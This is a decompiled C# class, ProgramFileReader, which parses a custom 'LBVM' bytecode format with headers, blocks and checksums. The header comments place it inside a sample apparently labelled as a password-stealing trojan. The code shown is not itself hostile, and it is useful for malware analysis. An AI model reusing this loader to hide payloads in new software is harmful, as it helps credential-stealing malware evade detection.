// Decompiled with JetBrains decompiler
// Type: org.lb.lbvm.ProgramFileReader
// Assembly: GCCollectionMo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3A5CAC9E-800C-431E-83D8-5129C6781923
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\Trojan-PSW.Win32.Stealer.aezg-0c850189152813ace3063af65fad784dace09ebd9778423c04aa0881b0d0cc09.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace org.lb.lbvm
{
  internal sealed class ProgramFileReader
  {
    private readonly Stream data;
    private readonly CoreCodes file;
    private bool DoneReading;
    private byte checksum1;
    private byte checksum2;
    private int version;
    private byte[] bytecode;
    private readonly List<string> symbolTable = new List<string>();

    public CoreCodes ProgramFile => this.file;

    public ProgramFileReader(Stream data)
    {
      this.DoneReading = false;
      this.data = data;
      this.file = this.Read();
    }

    private CoreCodes Read()
    {
      this.ReadFileHeader();
      while (!this.DoneReading)
        this.ReadBlock();
      string[] strArray = new string[this.symbolTable.Count];
      this.symbolTable.CopyTo(strArray);
      return new CoreCodes(this.version, this.bytecode, strArray);
    }

    private void ReadFileHeader()
    {
      if (this.readString(4) != "LBVM")
        throw new FileLoadException("Invalid data format");
      this.version = (int) this.ReadByte();
      if (this.version != 1)
        throw new FileLoadException("Unsupported data file version " + this.file.Version.ToString());
      int num1 = (int) this.ReadByte();
      int num2 = (int) this.ReadByte();
      int num3 = (int) this.ReadByte();
    }

    private void ReadBlock()
    {
      byte checksum1 = this.checksum1;
      byte checksum2 = this.checksum2;
      int num = (int) this.ReadByte();
      byte[] contents = this.ReadBytes(this.ReadInt());
      if (num == 1)
        this.DecodeCodeBlock(contents);
      else if (num == 2)
      {
        this.DecodeSymbolTableBlock(contents);
      }
      else
      {
        if (num != (int) byte.MaxValue)
          throw new FileLoadException("Invalid block type " + num.ToString());
        this.DecodeFooterBlock(contents, checksum1, checksum2);
      }
    }

    private void DecodeCodeBlock(byte[] contents) => this.bytecode = contents;

    private void DecodeSymbolTableBlock(byte[] contents)
    {
      char[] destinationArray = new char[contents.Length];
      Array.Copy((Array) contents, (Array) destinationArray, contents.Length);
      int int32_1;
      for (int startIndex = 0; startIndex < contents.Length; startIndex += 8 + int32_1)
      {
        int int32_2 = BitConverter.ToInt32(contents, startIndex);
        int32_1 = BitConverter.ToInt32(contents, startIndex + 4);
        string str = new string(destinationArray, startIndex + 8, int32_1);
        if (int32_2 != this.symbolTable.Count)
          throw new FileLoadException("Invalid symbol table entry");
        this.symbolTable.Add(str);
      }
    }

    private void DecodeFooterBlock(byte[] contents, byte cs1, byte cs2)
    {
      this.DoneReading = true;
      if (contents.Length != 2 || (int) contents[0] != (int) cs1 || (int) contents[1] != (int) cs2)
        throw new FileLoadException("Invalid data checksum");
    }

    private byte ReadByte()
    {
      int b = this.data.ReadByte();
      if (b == -1)
        throw new FileLoadException("Unexpected end of data stream");
      this.AddByteToChecksums((byte) b);
      return (byte) b;
    }

    private byte[] ReadBytes(int dataSize)
    {
      byte[] buffer = new byte[dataSize];
      if (this.data.Read(buffer, 0, dataSize) != dataSize)
        throw new FileLoadException("Unexpected end of data stream");
      foreach (byte b in buffer)
        this.AddByteToChecksums(b);
      return buffer;
    }

    private void AddByteToChecksums(byte b)
    {
      this.checksum1 += b;
      this.checksum2 ^= b;
    }

    private int ReadInt() => BitConverter.ToInt32(this.ReadBytes(4), 0);

    private string readString(int length)
    {
      char[] destinationArray = new char[length];
      Array.Copy((Array) this.ReadBytes(length), (Array) destinationArray, length);
      return new string(destinationArray);
    }
  }
}
